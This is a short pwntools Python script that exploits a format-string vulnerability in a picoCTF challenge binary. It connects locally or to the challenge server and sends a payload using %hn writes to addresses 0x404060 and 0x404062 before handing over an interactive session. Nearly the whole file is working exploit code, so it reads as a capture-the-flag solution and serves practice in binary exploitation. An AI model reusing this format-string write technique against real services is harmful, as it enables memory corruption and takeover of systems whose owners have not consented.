#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf
context.log_level = "debug"

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("rhea.picoctf.net", 61390)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    payload = flat(b'%26464d,%19$hn,%1283d,%18$hn,AAA', 0x404060, 0x404062)

    io.sendlineafter(b'say?', payload)
    io.interactive()

if __name__ == "__main__":
    main()
